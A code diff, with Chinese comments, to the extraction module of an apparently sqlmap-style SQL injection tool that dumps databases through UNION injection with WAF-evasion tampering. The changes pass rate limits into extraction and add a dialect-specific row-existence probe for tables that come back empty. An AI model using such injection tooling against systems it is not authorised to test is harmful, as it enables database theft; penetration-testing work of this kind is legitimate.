@@ -18,6 +18,8 @@ import { nullSequence } from './payloads.js';
 import { discoverEchoColumns, buildInjectionRequest } from './injection.js';
 import { binaryGuessColumns } from './columnGuess.js';
 import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
+// [P0-FIX 2026-09-09] 出口选项同源（delay/reqRate/maxReq/cookieJar 等必须在提取阶段也生效）
+import { buildEgressOpts } from './egressOpts.js';
 import { defaults } from '../config/defaults.js';
 import {
   resolveDbms, tableRef,
@@ -76,23 +78,26 @@ export class Extractor {
     const v = obfuscateWithConfig(value, ctx);
     const req = this._build(ctx.target, ctx.point, v);
     try {
-      return await ctx.httpClient.request({
-        method: req.method,
-        url: req.url,
-        params: req.params,
-        data: req.data,
-        headers: req.headers,
-        sql: req.sql, // 直连模式由 DirectConnector 执行 req.sql；HTTP 模式下 HttpClient 忽略该字段
-        timeoutMs: opts.timeoutMs ?? config.timeoutMs,
-        retry: opts.retry ?? config.retry,
-        proxy: config.proxy ?? false,
-        auth: config.auth ?? null,
-        wafEvasion: config.wafEvasion ?? null,
-        // [P0-FIX] 提取路径放大响应上限：GROUP_CONCAT 聚合整页数据可能超过默认 5MB，
-        // 大表/宽行拖库默认 5MB 上限会静默截断响应（axios 抛错 → _send 返回 null → 当末页）。
-        // 提取请求用 EXTRACT_MAX_BODY_BYTES（默认 50MB，EXTRACT_MAX_BODY_MB 可调）。
-        maxContentLength: config.maxExtractBodyBytes ?? EXTRACT_MAX_BODY_BYTES,
-      });
+      return await ctx.httpClient.request(
+        // [P0-FIX 2026-09-09] 出口选项同源。这里是**第四份手拄**，而且漏的是最贵的几个键：
+        // `delay` / `reqRate` / `maxReq` 全部未透传 → 盲注提取（动辄数千到数万请求）完全不受
+        // --delay / --reqrate / --max-requests 约束：用户以为「已限速、已设请求上限」，实际只有
+        // 检测阶段受限，一到提取阶段就全速裸奔（客户系统被打挂、出口 IP 被 WAF 拉黑都发生在这里）。
+        buildEgressOpts(config, {
+          method: req.method,
+          url: req.url,
+          params: req.params,
+          data: req.data,
+          headers: req.headers,
+          sql: req.sql, // 直连模式由 DirectConnector 执行 req.sql；HTTP 模式下 HttpClient 忽略该字段
+          timeoutMs: opts.timeoutMs ?? config.timeoutMs,
+          retry: opts.retry ?? config.retry,
+          // [P0-FIX] 提取路径放大响应上限：GROUP_CONCAT 聚合整页数据可能超过默认 5MB，
+          // 大表/宽行拖库默认 5MB 上限会静默截断响应（axios 抛错 → _send 返回 null → 当末页）。
+          // 提取请求用 EXTRACT_MAX_BODY_BYTES（默认 50MB，EXTRACT_MAX_BODY_MB 可调）。
+          maxContentLength: config.maxExtractBodyBytes ?? EXTRACT_MAX_BODY_BYTES,
+        })
+      );
     } catch (e) {
       // [审计 P3] 提取请求失败时记录原因，便于运维定位（不改变静默降级语义）
       logger.debug(`[extractor._send] 提取请求失败：${e && e.message ? e.message : e}`);
@@ -318,8 +323,50 @@ export class Extractor {
         break;
       }
     }
+    // [P0 2026-09-09 实战批次] 「0 行」恒真对照：空结果可能是「空表」也可能是
+    // 「提取通路不稳」（UNION 回显被 WAF/类型限制拦死）。补 1 次行存在性探针区分：
+    //   · 探针有行 → 表非空但提取 0 行 → 判「未确认」并回调（进报告 constraints，人工复核）；
+    //   · 探针无行 → 真空表，静默（零额外标注）。
+    // 仅在主循环 0 行时多花 1 次请求；探针失败视为无法判定 → 保守标「未确认」。
+    if (all.length === 0 && !opts.skipEmptyConfirm) {
+      const verdict = await this._confirmEmptyTable(ctx, db, table);
+      if (verdict === 'unconfirmed') {
+        logger.warn(`[extract] ${db}.${table} 提取 0 行但行存在性探针有数据 → 标记未确认（提取通路可能不稳）`);
+        opts.onUnconfirmedEmpty?.(db, table);
+      }
+    }
     // 续跑时前置拼接已完成区间的历史行，保证返回行集连续完整
     return historyRows && historyRows.length ? [...historyRows, ...all] : all;
+  }
+
+  // 「0 行」行存在性探针：SELECT 1 FROM <table> LIMIT 1（按方言）。
+  // 返回 'empty'（无行）| 'unconfirmed'（有行/探针异常——保守判未确认）。
+  async _confirmEmptyTable(ctx, db, table) {
+    const edb = resolveDbms(ctx.dbms);
+    const qual = db && db !== 'main' && db !== 'current' ? `${db}.` : '';
+    const t = `${qual}${table}`;
+    let sql;
+    switch (edb) {
+      case 'SQL Server':
+        sql = `SELECT TOP 1 1 FROM ${t}`;
+        break;
+      case 'Oracle':
+        sql = `SELECT 1 FROM ${t} WHERE ROWNUM = 1`;
+        break;
+      case 'DB2':
+        sql = `SELECT 1 FROM ${t} FETCH FIRST 1 ROWS ONLY`;
+        break;
+      default: // MySQL / PostgreSQL / SQLite / MariaDB / TiDB / H2 …
+        sql = `SELECT 1 FROM ${t} LIMIT 1`;
+    }
+    try {
+      const columns = await this._guessColumnsCached(ctx);
+      const val = await this.extractScalar(ctx, sql, columns);
+      return val != null && String(val) !== '' ? 'unconfirmed' : 'empty';
+    } catch (e) {
+      logger.debug(`[extract] 空结果行存在性探针失败（${db}.${table}）：${e.message}`);
+      return 'unconfirmed'; // 探针失败 → 无法证明是空表 → 保守标未确认
+    }
   }
 
   // 行级断点续传的历史行取回：从会话已落盘的提取结果里找该表的行。
@@ -664,7 +711,7 @@ export class Extractor {
       const cols = await this.enumerateColumns(ctx, db, table);
       columns[table] = cols;
       try {
-        rows[table] = await this.dumpData(ctx, db, table, cols);
+        rows[table] = await this.dumpData(ctx, db, table, cols, null, opts);
       } catch (e) {
         // UNION 提取失败（WAF/列数限制）→ 堆叠深度提取兜底（需目标支持 stacked queries）
         if (opts.fallback) {
@@ -687,8 +734,17 @@ export class Extractor {
     const tables = {};
     const columns = {};
     const rows = {};
+    // [P0 2026-09-09] 「0 行未确认」表收集：空结果 ≠ 空表，交付前必须可见
+    const unconfirmedEmpty = [];
+    const workerOpts = {
+      ...opts,
+      onUnconfirmedEmpty: (db, table) => {
+        unconfirmedEmpty.push(`${db}.${table}`);
+        opts.onUnconfirmedEmpty?.(db, table);
+      },
+    };
     const worker = async (db) => {
-      const dumped = await this.dumpDatabase(ctx, db, opts);
+      const dumped = await this.dumpDatabase(ctx, db, workerOpts);
       tables[db] = dumped.tables;
       for (const [t, cols] of Object.entries(dumped.columns)) {
         columns[`${db}.${t}`] = cols;
@@ -698,7 +754,7 @@ export class Extractor {
       }
     };
     await this._concurrentMap(dbs, worker, concurrency);
-    return { databases: dbs, tables, columns, rows };
+    return { databases: dbs, tables, columns, rows, meta: unconfirmedEmpty.length ? { dumpUnconfirmed: unconfirmedEmpty } : null };
   }
 
   // 通用并发映射：任务间顺序无关；单任务异常被吞，不中断其他任务（与 _sendBatch 一致容错）
